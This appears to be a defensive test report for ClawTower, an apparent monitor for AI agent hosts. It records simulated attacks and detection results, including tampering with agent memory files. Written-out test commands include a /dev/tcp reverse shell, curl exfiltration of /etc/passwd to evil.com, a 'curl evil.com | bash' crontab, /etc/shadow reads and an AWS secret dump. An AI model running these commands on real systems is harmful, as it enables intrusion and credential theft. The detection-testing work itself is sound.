# POC Attack Simulation Results

**Date:** 2026-02-16  
**Platform:** Raspberry Pi 5 (arm64), ClawTower v0.3.1  
**Scorecard:** 9/10 attacks detected

---

## Test Results

### TEST 1 — SOUL.md Tampering (Cognitive File Protection)

- **Attack:** Write malicious content to a Protected cognitive file
- **Expected:** Critical alert, file quarantined and restored from shadow copy
- **Actual:** `[Critical] sentinel: THREAT detected in SOUL.md, quarantined`
- **Verdict:** ✅ DETECTED — Quarantine + shadow restore working

### TEST 2 — MEMORY.md Tampering (Watched File)

- **Attack:** Modify a Watched (not Protected) cognitive file
- **Expected:** Info-level change notification with diff
- **Actual:** `[Info] sentinel: File changed: MEMORY.md`
- **Verdict:** ✅ DETECTED — Watched file logged at correct severity with diff capability

### TEST 3 — /etc/shadow Read (Privilege Escalation)

- **Attack:** `cat /etc/shadow`
- **Expected:** Policy and/or behavior alert
- **Actual:** Two independent alerts:
  - `[Critical] policy: [POLICY:deny-shadow-read]`
  - `[Critical] behavior: [BEHAVIOR:PRIV_ESC] cat /etc/shadow`
- **Verdict:** ✅ DETECTED — Dual-layer detection (policy + behavior)

### TEST 4 — Reverse Shell Pattern

- **Attack:** `bash -c echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"`
- **Expected:** Critical alert for reverse shell pattern
- **Actual:** `[Critical] policy: [POLICY:detect-reverse-shell] Detect reverse shell patterns`
- **Verdict:** ✅ DETECTED — Pattern caught even though payload was echo'd, not executed

### TEST 5 — Data Exfiltration via curl

- **Attack:** `curl -X POST -d @/etc/passwd https://evil.com/exfil`
- **Expected:** Exfiltration alert
- **Actual:** Two independent alerts:
  - `[Critical] policy: [POLICY:block-data-exfiltration]`
  - `[Critical] behavior: [BEHAVIOR:DATA_EXFIL]`
- **Verdict:** ✅ DETECTED — Dual-layer detection

### TEST 6 — Crontab Persistence

- **Attack:** Install malicious crontab with `curl evil.com | bash`
- **Expected:** Persistence/tampering alert
- **Actual:** **8 alerts from 3 layers:**
  - SecureClaw patterns: crontab modification + remote code execution (`curl|bash`)
  - Behavior classifier: `[BEHAVIOR:SEC_TAMPER]`
  - Policy engine: `[POLICY:block-data-exfiltration]` + `[POLICY:detect-crontab-modification]`
- **Verdict:** ✅ DETECTED — Defense in depth at its best

### TEST 7 — Reconnaissance

- **Attack:** `whoami`, `id`, `uname -a`, `cat /etc/passwd`
- **Expected:** Recon-class warnings
- **Actual:**
  - `[Warning] behavior: [BEHAVIOR:RECON]` for whoami, id, uname -a
  - `[Critical] policy: [POLICY:deny-sensitive-write]` for /etc/passwd access (mislabeled as "write" but still caught)
- **Verdict:** ✅ DETECTED — Note: policy name should be `deny-sensitive-read` (cosmetic bug)

### TEST 8 — Environment Variable Exfiltration

- **Attack:** `env` and `printenv AWS_SECRET_ACCESS_KEY`
- **Expected:** Recon or exfil alert
- **Actual:** `[Warning] behavior: [BEHAVIOR:RECON]` for both commands
- **Verdict:** ✅ DETECTED

### TEST 9 — LD_PRELOAD Injection

- **Attack:** `LD_PRELOAD=/tmp/evil.so ls`
- **Expected:** Alert for library injection attempt
- **Actual:** No alert. The .so didn't exist so `ls` ran normally.
- **Verdict:** ⚠️ MISSED
- **Gap:** No auditd rule or behavior pattern watching for LD_PRELOAD environment variable abuse
- **Remediation:** Add behavior pattern for `LD_PRELOAD=` in command lines, or auditd rule on the env var

### TEST 10 — Base64 Decode (Obfuscation)

- **Attack:** `echo <encoded> | base64 -d`
- **Expected:** Exfil or obfuscation alert
- **Actual:** `[Warning] behavior: [BEHAVIOR:DATA_EXFIL] base64 -d`
- **Verdict:** ✅ DETECTED

---

## Summary

| Metric | Value |
|--------|-------|
| Tests run | 10 |
| Detected | 9 |
| Missed | 1 (LD_PRELOAD) |
| Detection rate | **90%** |

## Notable Findings

1. **Multi-layer detection works.** Tests 3, 5, and 6 triggered alerts from multiple independent detection systems (policy engine, behavior classifier, SecureClaw patterns). No single point of failure.

2. **Defense in depth is real.** The crontab test (TEST 6) generated 8 alerts from 3 layers. An attacker would need to evade all of them.

3. **Cognitive file protection works.** SOUL.md tampering was immediately quarantined with shadow-copy restore capability. This is ClawTower's unique value for AI agent deployments.

4. **The LD_PRELOAD gap is addressable.** Add a behavior pattern matching `LD_PRELOAD=` in process command lines, or an auditd watch on environment variable manipulation. Low effort fix.

5. **Minor cosmetic bug.** TEST 7's `/etc/passwd` read triggered `deny-sensitive-write` instead of a read-specific policy. Detection worked, label is wrong.

> **Note:** The results above reflect testing against **ClawTower v0.3.1**.

---

## v0.3.3 Hardening Summary

Red Lobster v4 adversarial testing identified several detection gaps. The following fixes were implemented in v0.3.3:

### ESCAPE — Network Evasion Fixes
- **iptables log prefix mismatch fix** — The network monitor's `log_prefix` config was not matching the actual iptables rule prefix, causing missed network alerts. Prefix now correctly aligns between `setup-iptables.sh` and `config.toml`.
- **auditd `connect()` syscall monitoring** — Added auditd rules to monitor `connect()` (syscall 203 on aarch64) for the watched user, catching outbound connection attempts that bypass iptables logging (e.g., direct socket connections).

### EXFIL — Data Exfiltration Coverage Expansion
- **Binary coverage expanded from 9 → 15** — Added `dd`, `rsync`, `scp`, `sftp`, `openssl s_client`, and `ncat` to exfiltration detection patterns.
- **`dd` syntax detection** — Added pattern matching for `dd if=/path of=/dev/tcp/...` and pipe-based exfil via `dd`.
- **Node.js allowlist tightened** — Reduced the Node.js safe-host allowlist to prevent `node -e` with `http.request()` from evading detection.

### PERSIST — Persistence Detection Expansion
- **New patterns:** `npm install -g` (global package persistence), `python -m pip install` (Python package persistence), `crontab` (enhanced beyond `-l` exclusion), `at` command scheduling.
- Sentinel `is_persistence_critical()` now covers systemd user units, autostart `.desktop` files, and git hooks.

### API Auth
- API endpoint authentication flags hardened — unauthenticated access to sensitive endpoints restricted.

### Verification Status
These fixes require **Red Lobster v5 testing** to verify effectiveness. The v0.3.1 scorecard (9/10, 90% detection rate) should improve significantly once verified.
